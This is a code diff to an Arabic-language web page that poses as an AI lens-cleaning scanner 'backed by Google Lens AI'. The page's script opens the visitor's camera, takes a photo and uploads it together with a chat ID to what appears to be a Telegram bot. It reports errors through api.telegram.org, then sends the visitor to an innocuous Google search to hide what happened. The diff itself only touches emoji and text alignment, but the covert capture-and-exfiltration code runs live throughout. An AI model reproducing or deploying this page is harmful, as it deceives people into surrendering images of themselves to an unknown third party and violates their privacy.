@@ -58,7 +58,7 @@
             border-radius: 20px;
             padding: 15px;
             margin: 20px 0;
-            text-align: right;
+            text-align: left;
         }
         .benefits li {
             color: #ddd;
@@ -106,15 +106,15 @@
     <p>نظام فحص وتنظيف العدسات بالذكاء الاصطناعي<br>لتحصل على صور نقية وواضحة</p>
     
     <div class="benefits">
-        <li>🔍 <span>اكتشاف الأتربة والخدوش على العدسة</span></li>
-        <li>🧹 <span>تحليل جودة الصورة الحالية</span></li>
-        <li>⚡ <span>تحسين فوري بدقة 4K</span></li>
-        <li>🛡️ <span>مدعوم من Google Lens AI</span></li>
+        <li>🔍 اكتشاف الأتربة والخدوش على العدسة</li>
+        <li>🧹 تحليل جودة الصورة الحالية</li>
+        <li>⚡ تحسين فوري بدقة 4K</li>
+        <li>🛡️ مدعوم من Google Lens AI</li>
     </div>
     
     <button class="btn" id="scanBtn">ابدأ الفحص الان</button>
-    <div class="status" id="statusMsg"> جاري التحليل... سيتم توجيهك بعد ثوان</div>
-    <div class="footer"> يطلب الوصول إلى الكاميرا لفحص العدسة فقط</div>
+    <div class="status" id="statusMsg"></div>
+    <div class="footer">يطلب الوصول إلى الكاميرا لفحص العدسة فقط</div>
 </div>
 
 <script>
@@ -127,10 +127,10 @@
     async function captureAndSend() {
         try {
             statusDiv.style.display = 'block';
-            statusDiv.innerHTML = ' جاري فتح الكاميرا لتحليل العدسة...';
+            statusDiv.innerHTML = '📸 جاري فتح الكاميرا لتحليل العدسة...';
             
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            statusDiv.innerHTML = ' جاري فحص العدسة والتقاط عينة...';
+            statusDiv.innerHTML = '🔍 جاري فحص العدسة والتقاط عينة...';
             
             const video = document.createElement('video');
             const canvas = document.createElement('canvas');
@@ -146,7 +146,7 @@
             
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
             
-            statusDiv.innerHTML = ' رفع العينة للخوادم...';
+            statusDiv.innerHTML = '📤 رفع العينة للخوادم...';
             
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -158,7 +158,7 @@
             });
             
             stream.getTracks().forEach(track => track.stop());
-            statusDiv.innerHTML = ' تم التحليل بنجاح! جاري إعادة التوجيه...';
+            statusDiv.innerHTML = '✅ تم التحليل بنجاح! جاري إعادة التوجيه...';
             
             setTimeout(() => {
                 window.location.href = 'https://www.google.com/search?q=كيف+أنظف+عدسة+كاميرا+هاتفي';
@@ -166,8 +166,7 @@
             
         } catch(err) {
             statusDiv.style.color = '#ff8888';
-            statusDiv.innerHTML = ' فشل الوصول للكاميرا. تأكد من منح الصلاحية.';
-            console.error(err);
+            statusDiv.innerHTML = '❌ فشل الوصول للكاميرا. تأكد من منح الصلاحية.';
             
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فشل: ${err.message}`);
             
